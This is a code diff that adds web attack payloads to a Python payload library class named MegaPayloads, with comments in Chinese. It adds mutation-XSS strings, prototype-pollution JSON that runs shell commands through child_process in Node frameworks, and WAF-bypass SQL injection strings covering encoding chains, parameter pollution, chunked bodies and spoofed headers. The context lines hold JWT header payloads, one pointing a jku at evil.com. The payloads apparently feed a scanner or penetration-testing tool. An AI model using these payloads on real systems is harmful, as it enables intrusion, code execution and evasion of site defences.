@@ -772,3 +772,128 @@ class MegaPayloads:
         '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}',
         '{"alg":"HS256","typ":"JWT","jku":"http://evil.com/jwks.json"}',
     ]
+
+    # ==================== mXSS变体 (20+) ====================
+    MXSS = [
+        # 基于noscript的mXSS
+        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+        '<noscript><style></noscript><img src=x onerror=alert(1)>',
+        '<noscript><textarea></noscript><img src=x onerror=alert(1)>',
+        # 基于math/svg的mXSS
+        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
+        '<math><mtext><table><mglyph><svg><style><img src=x onerror=alert(1)>',
+        '<svg><foreignObject><div><svg><script>alert(1)</script>',
+        '<svg><desc><svg><script>alert(1)</script>',
+        '<svg><title><svg><script>alert(1)</script>',
+        # 基于template的mXSS
+        '<template><style><img src=x onerror=alert(1)></template>',
+        '<template><script>alert(1)</script></template>',
+        # 基于frameset的mXSS
+        '<frameset onload=alert(1)><frame src=javascript:alert(1)>',
+        # XMP/LISTING/PLAINTEXT mXSS
+        '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
+        '<listing><p title="</listing><img src=x onerror=alert(1)>">',
+        '<plaintext><img src=x onerror=alert(1)>',
+        # IFRAME srcdoc mXSS
+        '<iframe srcdoc="<script>parent.alert(1)</script>">',
+        '<iframe srcdoc="<img src=x onerror=parent.alert(1)>">',
+        # 基于注释的mXSS
+        '<!--<img src="--><img src=x onerror=alert(1)//">',
+        '<!--[if IE]><img src=x onerror=alert(1)><![endif]-->',
+        # 基于CDATA的mXSS
+        '<![CDATA[<script>alert(1)</script>]]>',
+        '<svg><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></svg>',
+    ]
+    
+    # ==================== Prototype Pollution (25+) ====================
+    PROTOTYPE_POLLUTION = [
+        # 基础污染
+        '{"__proto__":{"admin":true}}',
+        '{"__proto__":{"isAdmin":true}}',
+        '{"constructor":{"prototype":{"admin":true}}}',
+        # 路径遍历污染
+        '{"__proto__":{"outputFunctionName":"x]});process.mainModule.require(\'child_process\').exec(\'id\')//"}',
+        '{"__proto__":{"client":true,"escapeFunction":"1; return process.mainModule.require(\'child_process\').execSync(\'id\')"}}',
+        # 常见框架利用
+        '{"__proto__":{"shell":"node"}}',
+        '{"__proto__":{"NODE_OPTIONS":"--require /proc/self/cmdline"}}',
+        '{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/pwned"}}}',
+        # Lodash相关
+        '{"__proto__":{"sourceURL":"\\u000areturn x]});process.mainModule.require(\'child_process\').execSync(\'id\')//"}',
+        # Express/Pug相关
+        '{"__proto__":{"block":{"type":"Text","line":"console.log(process.mainModule.require(\'child_process\').execSync(\'id\').toString())"}}}',
+        '{"__proto__":{"compileDebug":true}}',
+        '{"__proto__":{"self":true}}',
+        # Handlebars相关
+        '{"__proto__":{"pendingContent":"<script>alert(1)</script>"}}',
+        # jQuery相关
+        '{"__proto__":{"preventDefault":"x]});alert(1)//"}}',
+        # Vue.js相关
+        '{"__proto__":{"v-if":"_c.constructor(\'alert(1)\')()"}}',
+        # 嵌套污染
+        '{"a":{"__proto__":{"b":"polluted"}}}',
+        '{"x":1,"__proto__":{"y":2},"z":{"__proto__":{"w":3}}}',
+        # 数组污染
+        '{"__proto__":{"0":"polluted"}}',
+        '{"__proto__":{"length":100}}',
+        # 函数污染
+        '{"__proto__":{"toString":"function(){return \'polluted\'}"}}',
+        '{"__proto__":{"valueOf":"function(){return \'polluted\'}"}}',
+    ]
+    
+    # ==================== 高级WAF绕过Payload (50+) ====================
+    ADVANCED_WAF_BYPASS = {
+        "chunked_encoding": [
+            # 通过Transfer-Encoding: chunked绕过
+            "5\r\nUNION\r\n6\r\nSELECT\r\n",
+            "7\r\n' OR '1\r\n5\r\n'='1\r\n",
+        ],
+        "http_param_pollution": [
+            # HPP绕过
+            "id=1&id=' OR '1'='1",
+            "id=1%00&id=' OR '1'='1",
+            "id=1/*&id=*/' OR '1'='1",
+            "id=1&id=2&id=' UNION SELECT 1,2,3--",
+        ],
+        "encoding_chain": [
+            # 多重编码链
+            "%252527%252520OR%2525201=1",  # 三重URL编码
+            "%25%32%37%25%32%30OR%25%32%30%31=%31",  # 混合编码
+            "\\u0027\\u0020OR\\u0020\\u0031=\\u0031",  # Unicode
+            "&#39;&#32;OR&#32;1=1",  # HTML实体
+        ],
+        "unicode_normalization": [
+            # Unicode规范化绕过
+            "＇ OR ＇1＇=＇1",  # 全角字符
+            "ʼ OR ʼ1ʼ=ʼ1",  # 修饰字母
+            "′ OR ′1′=′1",  # Prime符号
+            "' OR '1'='1",  # 右单引号
+            "' OR '1'='1",  # 左单引号
+        ],
+        "protocol_level": [
+            # HTTP/2特性利用
+            # (需要实际HTTP/2请求，这里是payload示例)
+            "' OR '1'='1\r\n",  # 请求行注入
+            "X-Forwarded-For: 127.0.0.1\r\n\r\n' OR '1'='1",  # 头部走私
+        ],
+        "content_type_confusion": [
+            # Content-Type混淆
+            # application/x-www-form-urlencoded -> multipart/form-data
+            # 需要配合请求头修改
+            "----WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n' OR '1'='1\r\n----WebKitFormBoundary--",
+        ],
+        "request_method_switch": [
+            # 请求方法切换绕过
+            # GET -> POST -> PUT -> PATCH
+            "id=' OR '1'='1",  # 配合不同HTTP方法
+        ],
+        "header_injection": [
+            # 自定义头绕过
+            "X-Forwarded-For: 127.0.0.1",
+            "X-Original-URL: /admin",
+            "X-Rewrite-URL: /admin",
+            "X-Custom-IP-Authorization: 127.0.0.1",
+            "Content-Type: application/x-www-form-urlencoded; charset=ibm037",
+            "Content-Type: application/json; charset=utf-7",
+        ],
+    }
